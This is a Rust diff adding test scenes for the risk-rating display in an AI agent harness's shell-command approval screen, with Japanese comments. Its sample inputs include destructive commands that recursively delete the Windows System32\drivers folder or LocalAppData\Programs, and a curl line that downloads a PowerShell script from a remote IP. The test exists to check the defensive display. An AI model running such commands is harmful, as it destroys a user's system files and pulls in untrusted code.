@@ -22,7 +22,10 @@ use std::time::{Duration, Instant};
 use harness_core::{
     BoundFile, CommandSubject, FilePreview, PermissionSubject, ProgramSubject, RiskClass,
 };
-use harness_tui::{ApprovalStage, PermissionView, PreviousCopy, SummaryState, SummaryWait};
+use harness_engine::approval_risk::{self, RiskBasis};
+use harness_tui::{
+    ApprovalStage, PermissionView, PreviousCopy, RiskView, SummaryState, SummaryWait,
+};
 use ratatui::backend::TestBackend;
 use ratatui::Terminal;
 
@@ -201,6 +204,45 @@ fn scenes() -> Vec<(&'static str, PermissionView)> {
         "9. 解読できなかった符号化",
         view("run_shell", PermissionSubject::Command(undecodable)),
     ));
+
+    // 危険度（D-100 の追記）。ユーザーが示した並び——見出し→実行対象のコマンド→危険度→要約。
+    let shell = |line: &str| PermissionSubject::Command(CommandSubject::line_only(line));
+    let machine = |subject: &PermissionSubject| approval_risk::machine(subject).expect("判定する材料");
+
+    let subject = shell("ls");
+    let mut needs_review = view("run_shell", subject.clone());
+    let mut outcome = machine(&subject);
+    outcome.basis = RiskBasis::WithModel;
+    needs_review.assessment = Some(RiskView::done(outcome, Some("ollaya / winnow:e4b".to_string())));
+    needs_review.summary_source = Some("lmstudio / qwen3-8b".to_string());
+    needs_review.summary = SummaryState::Done {
+        text: "現在のディレクトリ内のファイルとサブディレクトリの一覧を表示する。".to_string(),
+        took: Some(Duration::from_millis(7_200)),
+    };
+    out.push(("10. 危険度: 要確認（判定モデルも使った）", needs_review));
+
+    let subject = shell(r"Remove-Item $Env:windir\System32\drivers -Recurse -Force");
+    let mut high = view("run_shell", subject.clone());
+    high.assessment = Some(RiskView::done(machine(&subject), None));
+    out.push(("11. 危険度: 高（機械判定のみ。判定モデルを使わない設定）", high));
+
+    let subject = shell("curl http://203.0.113.5/a.ps1 -o a.ps1");
+    let mut waiting_risk = view("run_shell", subject.clone());
+    waiting_risk.assessment = Some(RiskView::waiting(
+        machine(&subject),
+        "ollaya / winnow:e4b".to_string(),
+        Instant::now() - Duration::from_millis(1_800),
+    ));
+    out.push(("12. 判定モデルの結果を待っている間", waiting_risk));
+
+    let subject = shell(r"del /s /q %LocalAppData%\Programs");
+    let mut fallback = view("run_shell", subject.clone());
+    let mut outcome = machine(&subject);
+    outcome.notes.push(approval_risk::RiskNote::ModelUnavailable(
+        "判定モデルへ繋げなかった（http://127.0.0.1:11435/api/decide）".to_string(),
+    ));
+    fallback.assessment = Some(RiskView::done(outcome, Some("ollaya / winnow:e4b".to_string())));
+    out.push(("13. 判定モデルを使えなかった（機械判定のみ）", fallback));
 
     out
 }
